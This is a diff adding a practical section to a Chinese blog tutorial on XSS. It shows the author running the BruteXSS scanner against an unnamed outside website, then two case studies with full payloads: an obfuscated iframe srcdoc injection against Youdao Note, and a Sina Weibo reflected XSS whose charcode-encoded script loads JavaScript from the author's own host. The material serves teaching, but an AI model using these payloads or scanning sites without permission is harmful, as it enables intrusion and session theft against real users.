@@ -160,6 +160,77 @@ function escapeHtml (str) {
 
 总体来说，我们能做的只是降低 XSS 攻击的风险，XSS 的攻防战一直存在也十分复杂。最后给一下[XSS过滤绕过速查表](http://www.freebuf.com/articles/web/153055.html)，祝大家看得开心（溜了～
 
+## 实战 && 案例
+
+是否你会存在这样的侥幸心理，看完上文后觉得只要进行转义就行了，是的，其实只要进行转义就行了，问题就是从[XSS过滤绕过速查表](http://www.freebuf.com/articles/web/153055.html)看出，过滤规则表还是蛮多的。我们来简单的实战一下。
+
+XSS 检测工具有很多，有**BruteXSS**，**XSSer**，**Beef-XSS**等等，可以说靠自己在本地扫描自己本地项目是否存在 XSS 漏洞了。我们在这里用**BruteXSS**来演示一下，**仅做学习，切勿犯法。**
+
+### 实战
+
+> BruteXSS 是一个根据暴力注入参数的跨站点脚本检测工具，不仅仅支持 GET 请求，还支持 POST 请求。它能从指定的词库中夹在多种 payload 进行注入，并且使用指定的 payload 和扫描检查这些存在的 XSS 漏洞的参数。
+
+我们从 github 下载[BruteXSS](https://github.com/Bosco-Lam/BruteXss)，之所以下载这个是因为它有 wordlist-huge.txt，也就是我们所说的 payload 词库，它约有5000条 payload 脚本。接着我们还需要安装 Python 2.7，`pip install colorama` 和 `pip install Mechanize`。
+
+执行 `python brutexss.py`，正常情况下会出现以下界面：
+
+![](/images/http/xss-04.jpg)
+
+接着，搓搓期待的小手，我们可以到处学(sa)习(ye)了。找了好久好不容易才找到一个，于是我们就开始行动，具体的操作在这里就不讲解了，因为一步一步看操作，很简单。我们找的是使用 `GET` 方法，这类漏洞比较好找，只要对方有输入框即可(现在的浏览器以及网站多多少少都会防御部分XSS，所以不太好找)。
+
+![](/images/http/xss-05.png)
+
+可以看到参数 `q` 有一个遗漏的注入点，于是我们就来试试看，是否真的成效。
+
+![](/images/http/xss-06.png)
+
+(,,#ﾟДﾟ)，没想到居然成了，我试了好多几乎都被后台拦截了，这个居然成了(,,#ﾟДﾟ)。可以看出通过 payload 给出的攻击脚本能顺利的弹出 `1` 这个框。这个就是典型的**反射型 XSS 攻击。**
+
+除此之外，我们还可以利用该工具在一些破破烂烂的边缘网站发帖来实现**存储型 XSS攻击**。但是这个工具也只是辅助工具，并不代表通过该工具扫描不出的就无漏洞，更多攻击者靠的可是**技术以及经验。**
+
+### 案例
+
+> [乌云](http://www.wooyun.org)不在的第三个年头，想它。 ———— 鲁迅
+
+不仅仅是破破烂烂的边缘小网站，也有大公司也存在过 XSS 攻击的案例。
+
+#### 案例1 有道云笔记分享出现 XSS 攻击漏洞
+
+1. 编辑完有道云笔记后保存然后通过**Fiddler**或**Charles**进行抓包；
+2. 由于有道云在对 `iframe` 的 `srcdoc` 没做处理，因此可以利用这个弱点来进行注入 payload，然后分享给别人，payload 如下；
+3. 修复的方法也很简单，就是对其针对 `iframe` 的 `srcdoc` 加强过滤就行了；
+
+```js
+<#<iframe class=&quot;&#x7a;&#x68;&#x6f;&#x75;zhou&quot; src='javAscript:confirm(1111)'/1111111wooyun/)"');' href=`vBscript:msgbox('"');` srcdoc='vBscr&#x3c;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3e;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x64;&#x6f;&#x63;&#x75;&#x6d;&#x65;&#x6e;&#x74;&#x2e;&#x64;&#x6f;&#x6d;&#x61;&#x69;&#x6e;&#x29;&#x3b;&#x3c;&#x2f;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3e;ipt:msgbox('"');' alt=`
+
+` yuyangzhou="<iframe" onclick=eval('<script>alert(/martinzhou/)</script>'); style=&quot;font-family:e/* &#*/x/*&#x0000000022;*/p/*&gt;*/r/*onkeydown=*/ession(confirm(5));"iframe>zhou&quot;>5</iframe>
+
+``<div class=" \\'" src=&nbsp;javAscript:confirm('1"');&nbsp; href=`data:q;base64,PHNjcmlwdD5hbGVydCgnQHFhYicpPC9zY3JpcHQ+` srcdoc= javAscript:confirm('1"');  alt="zhou" yuyangzhou=``<div/onmouseover=prompt(1)` onload=alert('1"'); style=&nbsp;font-family:e/*;/*/x/*&#34;*/p/*&quot;*/r/*onclick=*/ession(confirm(0));""`<div/onmouseover=prompt(1)&nbsp;>0</div>
+```
+
+#### 案例2 新浪微博反射型 XSS
+
+1. 在新浪微博某个分享页，有这样的一个接口`http://book.weibo.com/newcms/i/weibo_send.php`；
+2. 当错误时返回的数据结构为如下；
+```js
+// 也就是说这个接口会校验`error.referer`
+{"code":-1,"message":"\u8bf7\u6c42\u6e90\u4e0d\u5141\u8bb8[http:\/\/error.referer]"}
+```
+3. 当`error.referer`返回来后页面的响应报文为`Content-Type: text/html; charset=utf-8`，既然错误后的`Content-Type`为`text/html`，那么我们就可以在此做文章；
+4. 虽然在 Chrome 和 Firefox 下，referrer 都会被进行 url encode导致无法插入HTML标签。**但是该问题，可以在 IE 进行 XSS 攻击；**
+5. 我们在自己的服务器做一些处理，向我们服务器发起请求，即在浏览器地址栏输入如下 URL；
+```js
+// e=document.createElement("script");e.src="http://a.xxx.xyz/book.weibo.js",document.documentElement.appendChild(e)
+// 将上面的转换为 char code 的形式
+// 完整 URL 如下
+http://a.xxx.xyz/?a=<img src=1 onerror=eval(String.fromCharCode(101,61,100,111,99,117,109,101,110,116,46,99,114,101,97,116,101,69,108,101,109,101,110,116,40,34,115,99,114,105,112,116,34,41,59,101,46,115,114,99,61,34,104,116,116,112,58,47,47,97,46,122,104,99,104,98,105,110,46,120,121,122,47,98,111,111,107,46,119,101,105,98,111,46,106,115,34,44,100,111,99,117,109,101,110,116,46,100,111,99,117,109,101,110,116,69,108,101,109,101,110,116,46,97,112,112,101,110,100,67,104,105,108,100,40,101,41))>
+```
+6. 请求后我们的服务器会重定向跳转到`http://book.weibo.com/newcms/i/weibo_send.php`，这时候的 `error.referer` 就会被我们植入 XSS 攻击脚本了。
+
+### 小结
+
+可以看到，大多数漏洞都是处于绕来绕去最后发现漏洞的地方没有进行过滤转义处理。正所谓 **攻击千万条，安全第一条。过滤不规范，开发两行泪。**
+
 ## 参考
 
 - [跨站脚本 - 维基百科，自由的百科全书](https://zh.wikipedia.org/wiki/%E8%B7%A8%E7%B6%B2%E7%AB%99%E6%8C%87%E4%BB%A4%E7%A2%BC)
